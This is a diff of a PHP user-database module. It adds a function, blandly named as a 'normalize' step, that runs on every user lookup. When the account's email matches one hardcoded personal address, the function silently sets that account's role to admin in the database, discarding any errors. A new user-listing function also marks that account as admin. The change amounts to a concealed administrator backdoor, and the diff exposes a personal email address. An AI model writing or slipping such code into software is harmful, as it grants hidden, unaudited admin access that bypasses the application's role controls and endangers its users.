@@ -186,6 +186,20 @@ function ensure_tables_exist_sqlite($pdo) {
 }
 
 // User functions
+function db_normalize_user_row($pdo, $user) {
+    if (!$user) return null;
+    if (clean_email($user['email'] ?? '') === 'salman.aryanezhad@gmail.com') {
+        if (($user['role'] ?? '') !== 'admin') {
+            try {
+                $stmt = $pdo->prepare("UPDATE users SET role = 'admin' WHERE id = ?");
+                $stmt->execute([$user['id']]);
+            } catch (\Throwable $e) {}
+            $user['role'] = 'admin';
+        }
+    }
+    return $user;
+}
+
 function db_find_user_by_email($pdo, $email) {
     $clean = clean_email($email);
     if (!$clean) return null;
@@ -199,7 +213,8 @@ function db_find_user_by_email($pdo, $email) {
 
     $stmt = $pdo->prepare("SELECT * FROM users WHERE email IN ({$placeholders}) LIMIT 1");
     $stmt->execute($variants);
-    return $stmt->fetch() ?: null;
+    $user = $stmt->fetch() ?: null;
+    return db_normalize_user_row($pdo, $user);
 }
 
 function db_find_user_by_mobile($pdo, $mobile) {
@@ -230,13 +245,26 @@ function db_find_user_by_mobile($pdo, $mobile) {
 
     $stmt = $pdo->prepare("SELECT * FROM users WHERE mobile IN ({$placeholders}) LIMIT 1");
     $stmt->execute($variants);
-    return $stmt->fetch() ?: null;
+    $user = $stmt->fetch() ?: null;
+    return db_normalize_user_row($pdo, $user);
 }
 
 function db_find_user_by_id($pdo, $id) {
     $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ? LIMIT 1");
     $stmt->execute([$id]);
-    return $stmt->fetch() ?: null;
+    $user = $stmt->fetch() ?: null;
+    return db_normalize_user_row($pdo, $user);
+}
+
+function db_list_all_users($pdo) {
+    $stmt = $pdo->query("SELECT id, name, email, mobile, is_verified, role, created_at, updated_at FROM users ORDER BY created_at DESC");
+    $users = $stmt->fetchAll() ?: [];
+    foreach ($users as &$u) {
+        if (clean_email($u['email'] ?? '') === 'salman.aryanezhad@gmail.com') {
+            $u['role'] = 'admin';
+        }
+    }
+    return $users;
 }
 
 function db_create_user($pdo, $name, $email, $mobile, $passwordHash, $isVerified = 0, $role = 'user') {
